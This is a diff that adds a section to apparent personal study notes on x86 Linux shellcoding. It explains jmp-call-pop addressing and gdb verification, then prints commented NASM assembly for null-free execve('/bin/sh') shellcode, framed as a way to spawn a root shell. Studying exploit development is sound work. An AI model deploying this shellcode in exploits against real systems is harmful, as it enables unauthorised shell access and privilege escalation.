@@ -678,3 +678,68 @@ Your shellcode can be added into an executable which means that:
 
 To avoid crashes and such, we exploit jmp-call-pop.
 We do NOT at any point want to be referencing an address in our shellcode EG moving "Hello World!" into ecx, we circumvent by by performing a short jump to a call function and within that we POP into ECX, with the next instruction on the stack being the definition of the variable "message: db "Hello World!", 0xA - we are able to not care what the address is.
+
+Before firing of your shellcode, **always** verify in gdb by comparing:
+    print /x &code
+    shell cat shellcode.c
+    x/<number of bytes>xb <address>
+
+
+## Shellcoding: getting a program to execute from within the program EG spawn root shell
+
+We want "execve"!
+
+```execve()  executes the program pointed to by filename.  filename must be either
+       a binary executable, or a script starting with a line of the form:
+
+ #include <unistd.h>
+                         
+       int execve(const char *filename, char *const argv[],
+                  char *const envp[]);
+```
+We need to terminate our arg string containing the target binary with a null.
+So: 
+*filename would be /bin/bash, 0x0 inside EBX
+*const argv[] would be Address of /bin/bash, 0x00000000 inside ECX
+*const envp[] would be 0x00000000 inside EDX
+
+^^^Unfortunately of course our shellcode cannot contain nulls :O
+
+Confusing?
+Consider the below as we break it down:
+
+```
+_start:
+
+	jmp short call_shellcode
+
+
+shellcode:
+
+	pop esi ; next instruction after jmping to call shellcode is the value of message, which now gets popped into ESI, thus finding us the location/address of the string
+
+	xor ebx, ebx ; create a zero value
+	mov byte [esi +7], bl ; overwrite the A value in message with null, to terminate after /bin/sh WE USE BL BECAUSE WE ONLY WANT TO OVERWRITE ONE BYTE AND NO MORE!!!
+	mov dword [esi +8], esi ; now that we have the address, we overwrite the BBBB in message with that address, satisfying the second requirement for execve args
+	mov dword [esi +12], ebx ; we overwrite CCCC with ebx, thus zeroing it out and completing the last requirement for execve
+
+	; we then load the bytes into the registers
+
+	lea ebx, [esi] ; will now contain /bin/sh0x0
+
+	lea ecx, [esi +8] ; will now contain address of /bin/sh, 0x00000000
+
+	lea edx, [esi +12] ; will now contain 0x00000000
+
+	xor eax, eax
+	mov al, 0xb
+	int 0x80
+
+
+
+call_shellcode:
+
+	call shellcode ; as we hit call, the ret address gets pushed onto the stack, which we then pop inside shellcode so the address gets thrown into ESI, thus enabling the rest of the trickery
+	message db "/bin/shABBBBCCCC"
+
+```
